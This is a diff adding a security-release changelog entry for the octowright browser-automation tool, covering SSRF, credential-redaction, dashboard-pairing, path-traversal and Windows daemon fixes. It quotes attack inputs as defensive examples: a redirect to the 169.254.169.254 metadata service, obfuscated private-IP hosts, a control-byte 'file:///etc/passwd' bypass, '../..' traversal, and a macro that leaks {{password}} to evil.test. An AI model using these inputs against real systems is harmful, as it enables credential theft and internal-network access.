@@ -5,6 +5,164 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.16.0] - 2026-08-19
+
+Security release. Ten findings from an adversarial sweep of the SSRF, credential,
+disk-write, and dashboard surfaces, plus four field-reported diagnostics gaps.
+Every one was reproduced against running code before it was fixed.
+
+### Changed
+- **BREAKING — the browser dashboard now requires pairing by default.**
+  `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING` flips from off to on. Loopback binding
+  and the Host/Origin guards stop a *remote* attacker and a *malicious web page*,
+  but they are not authentication: any other local process able to open a socket
+  to the port could enumerate live sessions, read recorded JSONL (typed input,
+  navigated URLs, console output), fetch video and screenshots, subscribe to the
+  live screencast, and drive the browser through persona/scenario/macro writes.
+  That made two on-by-default controls overstated — recordings are written 0600
+  and profile directories 0700 so a local user cannot read them off disk, and
+  then the daemon served the same bytes over HTTP to anyone who asked.
+  Mint a link with `octowright dashboard`, or ask an agent for it (see below).
+  Set the variable to a falsey token to restore the type-the-URL flow. Note an
+  **empty value now means ON**, matching `OCTOWRIGHT_RECORDINGS_PRIVATE`, so a
+  stray `VAR=` cannot silently disable a security default.
+  Enforcement additionally requires a credential to pair against: an inline
+  (`--no-singleton`) leader has no lockfile and therefore no capability token, so
+  under the default the gate degrades to unenforced there rather than shipping a
+  dashboard nobody can open; an explicit opt-in keeps fail-closed behaviour.
+  This does **not** defend against a same-user process, which can read the
+  lockfile and mint its own code; it closes the different-user and
+  sandboxed-process cases.
+- **BREAKING — `octowright_dashboard_url` returns a pairing URL.** `url` is now
+  `…/pair#<code>`; the bare address moved to `plain_url`, alongside
+  `pairing_required`, `pairing_expires_in`, and `pairing_hint`. Without this an
+  agent asked to show the dashboard handed the user a link that answers 401.
+  MCP-minted codes use a longer window than the CLI's 60s, because a human
+  reading an agent's message may not look for minutes; they stay single-use and
+  loopback-only.
+- `octowright_status()` gained `dashboard_pairing_required`. It keeps returning
+  the plain `dashboard_url` deliberately — status is polled often and the pairing
+  code store is a bounded LRU, so minting there would churn it and could evict a
+  code the user was just handed.
+
+### Security
+- **Accessibility snapshots no longer return password values.** Playwright renders
+  a text control's value as its accessible name and the tree has no notion of
+  `type=password`, so a filled login form came back as `- textbox: hunter2` from
+  `browser_snapshot`, `browser_brief` (in the **core** profile), `capture_create`,
+  `golden_save` (which persists it to disk indefinitely),
+  `browser_capture_and_close`, and the dashboard session detail.
+  `OCTOWRIGHT_REDACT_INPUTS` never covered any of it: it classifies a *typed
+  value* at fill/type time by inspecting the element, and a snapshot is neither.
+  Worse, `_resolve_semantic_metadata` parsed only the `button "Save"` rendering
+  and not `textbox: hunter2`, so the whole `role: value` string landed in `role`
+  — written into the JSONL recording on **every click**, in the default
+  configuration. All seven sinks now route through
+  `session/aria_redaction.aria_snapshot`, and an AST guard test fails on any new
+  raw `locator.aria_snapshot()` call.
+- **Persona profile directories are owner-only (0700).** Chromium hardens its own
+  profile root; Firefox and WebKit do not, writing `cookies.sqlite` at 0644 inside
+  an 0755 tree. A profile holds live session cookies for every site the persona
+  logged into — a strictly stronger credential than the typed password recordings
+  already protect. Opt out with `OCTOWRIGHT_PROFILES_PRIVATE`.
+- **The SSRF policy re-checks every redirect hop.** It previously inspected only
+  the URL that was asked for, so a public first hop answering
+  `302 Location: http://169.254.169.254/…` reached the metadata service and the
+  read tools returned its body. Playwright does **not** re-invoke a route handler
+  for a redirected request — measured after both `fallback()` and `fulfill()` —
+  so `ssrf_guard` walks the chain itself with `route.fetch(max_redirects=0)`,
+  validating each `Location` before the request that would fetch it. Costs,
+  confined to deployments that opted into a policy: an allowed GET navigation is
+  fetched twice (which is what keeps `page.url` and relative-URL resolution
+  correct), and non-GET navigations are not chain-checked because validating a
+  POST would double-submit it.
+- **The SSRF host check now parses hosts the way a browser does.** A trailing dot
+  (`169.254.169.254.`), a non-ASCII full stop, a percent-encoded octet
+  (`127.0.0.%31`), and fullwidth digits all walked past `block-private`.
+- **A leading control byte no longer defeats the scheme deny-list.**
+  `\x01file:///etc/passwd` passed, because `str.strip()` removes Python
+  whitespace while the URL standard strips every C0 control. Confirmed to return
+  local file contents through a real browser.
+- **`resolve_leader_url` no longer returns a URL it just rejected.** The
+  non-loopback check logged the rejection and then returned the value anyway,
+  because production passes the poisoned lockfile URL in as the fallback.
+- **`macro_artifact_verify(run_id=…)` is contained.** The caller-supplied id was
+  joined straight onto the artifact path, so `../..` escaped the recordings root
+  and `verification.json` was written at the traversal target.
+- **Credential macro args are refused in navigation and code sinks.**
+  `{"action": "navigate", "url": "https://evil.test/?p={{password}}"}` is an
+  ordinary macro shape, so a poisoned or shared macro could exfiltrate a
+  caller-supplied secret; `evaluate` handed it to page JavaScript instead.
+  Matching is by arg **name**, so `{{order_id}}` keeps working in a URL and a
+  credential keeps working in a `fill` value. Opt out with
+  `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`.
+
+### Fixed
+- **A macro failure now ships the console line that explains it.** The failure
+  payload built its diagnostic bundle with the default `console_tail=0` — and
+  since that is the only caller of `diagnostic_bundle` in the tree, the field
+  was unconditionally empty. So the payload reported the symptom ("timed out
+  waiting for `#student-name-edit`") while `net::ERR_NETWORK_CHANGED` sat unread
+  in the session's ring buffer, findable only by opening the raw JSONL
+  afterward. Half the window is reserved for the plain tail and the rest goes
+  to the newest errors and warnings, so neither a chatty page flushing the
+  useful line out of the window nor a page that logs ten warnings at load
+  (favicon 404, CSP report, deprecations) can crowd out the other. Failure
+  path only.
+- **The daemon detaches on Windows.** `start_new_session=True` is POSIX
+  (`setsid`); CPython accepts it on Windows and silently does nothing, so the
+  "daemon" kept the launching console and its process group. Windows now gets
+  `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`, plus
+  `CREATE_BREAKAWAY_FROM_JOB` to escape a CI runner's job object — with a
+  retry without it, since a job lacking `JOB_OBJECT_LIMIT_BREAKAWAY_OK` makes
+  `CreateProcess` refuse the spawn outright. Honest limit: a job that forbids
+  breakaway still takes the daemon down with the step, and this is not yet
+  verified on real Windows CI.
+- **Console-level classification is no longer duplicated three ways.**
+  `capture_summaries`, `inspect_console`, and the new diagnostic tail each had
+  their own idea of which levels matter, and they had drifted: Firefox reports
+  `console.warn` as level `warn` where Chromium says `warning`, so a set that
+  missed it buried Firefox warnings. One predicate now, in the package-root
+  `octowright.console_levels` — kept out of `session/` so a pure summarization
+  module does not import the browser stack to classify a log level.
+- **A failed daemon spawn says why.** Daemon stderr goes to a separate 0600 log,
+  so the file the error message points you at holds the *follower's* output and
+  is empty by design on exactly this failure. The inline fallback, the
+  post-bridge respawn, and `--wait-ready` all quote the daemon log tail now.
+- **A Windows image failure is named rather than misread as a network fault.**
+  `WSALookupServiceBegin ... 10091` and a failure to load `mf.dll`/`mfplat.dll`
+  both mean the image lacks OS components Chromium initializes at startup
+  (typical of Server Core), but read as a transient network problem and sent
+  people off checking DNS and proxies. Detected ahead of the generic network
+  detector, since the raw text can carry `net::` noise — and gated on the host
+  platform precisely because it runs first, so it cannot answer a Linux or
+  macOS failure with a Windows-only remedy.
+
+- `browser_capture_and_close` no longer risks stalling on its own session gate.
+  The aria scrubber takes the session lease, and the call site wrapped it in
+  `asyncio.wait_for`, which runs its argument in a new Task — a different owner
+  to the gate, so it would have queued behind the lease it was already holding.
+
+### Added
+- **`octowright serve --wait-ready`** — ensure a daemon leader is up, wait for it
+  to answer HTTP, print its MCP URL on stdout, and exit 0 (ready) or 1 (not,
+  with the daemon log tail). Every workflow was hand-rolling the same thing:
+  background `serve --keep-alive`, poll for the lockfile in bash/pwsh, and print
+  a guess when it never appeared — while `wait_for_daemon()` already did exactly
+  this internally. It deliberately does not inherit the inline-leader fallback:
+  serving in the foreground forever is right for an MCP client that wants *a*
+  working server and wrong for a script whose contract is an exit code.
+- **`--ready-timeout` / `OCTOWRIGHT_DAEMON_READY_TIMEOUT`** — the daemon
+  readiness budget is now reachable. It was hardcoded at 10s in
+  `wait_for_daemon`'s signature *and* every caller invoked it with no arguments,
+  so a cold container that needed longer silently degraded to fragile inline
+  mode instead of being given more time. A non-positive or non-finite
+  `--ready-timeout` is refused rather than floored back to the default, which
+  would leave the caller believing a flag took effect.
+- `OCTOWRIGHT_PROFILES_PRIVATE` — owner-only persona/profile directories (default on).
+- `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS` — refuse credential args in navigation/code
+  sinks (default on).
+
 ## [0.15.1] - 2026-08-18
 
 ### Fixed
